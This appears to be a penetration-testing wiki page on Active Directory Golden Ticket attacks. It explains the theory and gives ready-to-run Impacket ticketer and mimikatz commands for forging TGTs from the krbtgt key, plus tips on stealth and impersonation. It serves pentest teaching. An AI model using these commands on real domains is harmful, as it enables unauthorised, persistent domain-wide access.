# Golden tickets

## Theory

The long-term key of the `krbtgt` account can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with [Pass-the-ticket](../ptt.md) to access any resource within the AD domain. The `krbtgt`'s key is used to encrypt the PAC. In a Golden Ticket scenario, an attacker that has knowledge of the `krbtgt` long-term key, will usually forge a PAC indicating that the user belongs to privileged groups. This PAC will be embedded in a forged TGT. The TGT will be used to request Service Tickets than will then feature the PAC presented in the TGT, hence granting lots of access to the attacker.

## Practice

{% hint style="info" %}
When forging tickets, before November 2021 updates, the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.
{% endhint %}

In order to craft a golden ticket, testers need to find the `krbtgt`'s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](../../credentials/dumping/dcsync.md). Because of this, golden tickets only allow lateral movement and not privilege escalation.

{% hint style="info" %}
Microsoft now uses AES 256 bits by default. Using this encryption algorithm (instead of giving the NThash) will be stealthier.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used with [`kerberos::golden`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden) for this attack.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

{% hint style="success" %}
For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-kerberos) forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights).&#x20;

In these situations, testers can specify all the groups ids when creating the ticket. However, deny ACEs could actually prevent this from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id. This solution can also be reall inconvenient in domains that have lots of groups.&#x20;

Another solution to this is to look for a specific user with appropriate rights to impersonate and use [GoldenCopy](https://github.com/Dramelac/GoldenCopy) to generate a command that allows to forge a ticket with specific values corresponding to the target user (sid, group ids, etc.). The values are gathered from a neo4j database.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>Using GoldenCopy for specific user impersonation</p></figcaption></figure>

## References

{% embed url="https://en.hackndo.com/kerberos-silver-golden-tickets/" %}

{% embed url="https://adsecurity.org/?p=483" %}
